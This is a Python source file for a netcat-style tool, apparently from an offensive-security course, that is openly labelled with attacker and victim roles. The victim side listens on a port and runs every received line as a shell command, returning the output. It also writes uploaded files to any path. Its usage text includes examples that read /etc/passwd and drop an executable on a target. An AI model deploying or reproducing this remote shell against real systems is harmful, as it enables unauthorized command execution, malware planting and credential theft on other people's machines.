import sys
import socket
import getopt
import threading
import subprocess

# global variables
listen = False
command = False
execute = ""
target = "0.0.0.0"
upload_destination = ""
port = 0

# PROXI COMMAND SHELL EXAMPLE:
# ATTACKER: python3 bhpnet.py -t localhost -p 8080
# VICTIM:   python3 bhpnet.py -l -p 8080 -c


# PARSING
def usage():
    print(
        "Netcat Replacement\n\n"

        "Usage: bhpnet.py -t target_host -p port\n"
        "-l --listen                - listen on [host]:[port] for incoming connections\n"
        "-e --execute=file_to_run   - execute the given file upon receiving a connection\n"
        "-c --command               - initialize a command shell\n"
        "-u --upload=destination    - upon receiving connection upload a file and write to [destination]\n\n"

        "Examples: \n"
        "bhpnet.py -t 192.168.0.1 -p 5555 -l -c\n"
        "bhpnet.py -t 192.168.0.1 -p 5555 -l -u=c:\\target.exe\n"
        "bhpnet.py -t 192.168.0.1 -p 5555 -l -e=\"cat /etc/passwd\"\n"
        "echo 'ABCDEFGHI' | ./bhpnet.py -t 192.168.11.12 -p 135\n"
    )
    sys.exit(0)


# ATTACKER
def client_sender():
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        client.connect((target, port))

        while True:
            # wait for input
            buffer = input("<BHP:#> ")
            buffer += "\n"

            client.send(f'{buffer}'.encode())

            # wait for data back
            recv_len = 1
            response = ""

            while recv_len:
                # recieve data and decode into string
                data = client.recv(4096).decode()
                response += data

                if len(data) < 4096:
                    break

            print(response)

    except BaseException as e:
        print(f"[*] Error: {e}")
        client.close()


# VICTIM
def server_loop():
    print("[*] Starting server...")
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((target, port))

    server.listen(5)

    while True:
        client_socket = None
        try:
            client_socket, addr = server.accept()

            # new thread for client handling
            client_thread = threading.Thread(target=client_handler, args=(client_socket,))
            client_thread.start()

        except KeyboardInterrupt:
            print("\n[*] Shuting down.")

            if client_socket:
                client_socket.close()

            server.close()
            sys.exit(0)


# VICTIM
def run_command(cmd):
    # trim newline
    cmd = cmd.rstrip().encode()

    try:
        output = subprocess.check_output(cmd, stderr=subprocess.STDOUT, shell=True).decode()
    except BaseException as e:
        output = f"Failed to execute command.\nError: {e}"

    # if output is None (e.g at command "cd .."), send feedback, otherwise attacker does not recieve something
    # and can not enter another command
    if not output:
        output = "*** null ***\n"

    return output


# VICTIM
def client_handler(client_socket):
    print(f"[*] Recieved connection from: {client_socket.getpeername()}")
    global execute
    global command

    # check wheter to upload file
    if upload_destination:

        # read all bytes and write to destination
        file_buffer = ""

        # keep reading data until done
        while True:
            data = client_socket.recv(1024).decode()

            if not data:
                break
            else:
                file_buffer += data

        # try to write recieved bytes
        try:
            file_descriptor = open(upload_destination, "wb")
            file_descriptor.write(file_buffer.encode())
            file_descriptor.close()

            # ack file written
            client_socket.send(f'Successfully saved file to {upload_destination}\n'.encode())

        except BaseException as e:
            client_socket.send(f'Failed to save file to {upload_destination}\nError: {e}\n'.encode())

    # check wheter to execute command
    if execute:
        output = run_command(command)
        client_socket.send(f'{output}'.encode())

    # another loop if command shell was requested
    if command:
        while True:

            cmd_buffer = ""

            # recieve command data until end of command reached (\n)
            while "\n" not in cmd_buffer:
                cmd_buffer += client_socket.recv(1024).decode()

            print(f"<<< Got command: {cmd_buffer[0:-1]}")

            # run command and send response
            result = run_command(cmd_buffer)
            print(result)
            
            client_socket.send(f'{result}'.encode())


def main():
    global listen
    global port
    global execute
    global command
    global upload_destination
    global target

    print("Parsing...")

    if not len(sys.argv[1:]):
        usage()

    try:
        commands = ["help", "listen", "execute", "target", "port", "command", "upload"]
        opts, args = getopt.getopt(sys.argv[1:], "hle:t:p:cu:", commands)

        # PARSING
        for o, a in opts:
            if o in ("-h", "--help"):
                usage()
            elif o in ("-l", "--listen"):
                listen = True
            elif o in ("-e", "--execute"):
                execute = a
            elif o in ("-c", "--commandshell"):
                command = True
            elif o in ("-u", "--upload"):
                upload_destination = a
            elif o in ("-t", "--target"):
                target = a
            elif o in ("-p", "--port"):
                port = int(a)
            else:
                assert False, "Unhandled Option"

        mode = "Victim" if listen else "Attacker"
        print(f"[*] Mode: {mode}")

        params = {"listen": listen, "execute": execute, "command": command, "upload_destination": upload_destination,
                  "target": target, "port": port}
        reduced = [f"[***] {key}: {params[key]}" for key in params if params[key]]
        formatted = "\n".join(reduced)
        print(formatted)

        # ATTACKER
        if not listen and target != "0.0.0.0" and port > 0:
            input("[*] Press Enter to connect to Victim")
            client_sender()

        # VICTIM
        if listen:
            server_loop()

    except getopt.GetoptError as err:
        print(str(err))
        usage()


main()
